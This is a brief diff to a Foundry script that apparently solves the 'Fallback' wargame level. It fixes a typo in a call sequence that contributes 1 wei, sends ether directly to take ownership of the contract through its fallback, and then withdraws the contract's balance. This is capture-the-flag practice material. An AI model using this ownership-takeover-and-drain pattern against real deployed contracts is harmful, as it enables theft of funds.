@@ -9,7 +9,7 @@ contract FallbackSolution is Script {
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
 
-        fallbackInstance.contrivute{value: 1 wei}();
+        fallbackInstance.contribute{value: 1 wei}();
         address(fallbackInstance).call{value: 1 wei}("");
         fallbackInstance.withdraw();
 
